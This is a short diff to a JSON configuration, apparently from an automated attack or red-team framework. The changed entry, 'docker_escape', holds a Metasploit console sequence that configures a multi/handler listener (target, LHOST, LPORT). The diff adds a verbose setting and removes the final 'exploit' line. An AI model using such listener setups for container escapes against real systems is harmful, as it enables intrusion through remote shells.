@@ -8,7 +8,7 @@
         "config": ""
       },
       "docker_escape": {
-        "instructions": "back \nuse exploit/multi/handler \nset target {} \nset LHOST {} \nset LPORT {LPORT} \nexploit\n",
+        "instructions": "back \nuse exploit/multi/handler \nset target {} \nset LHOST {}\nset VERBOSE true \nset LPORT {LPORT}\n",
         "attack_type": "MetasploitAttack",
         "wait_time": "20",
         "config": ""
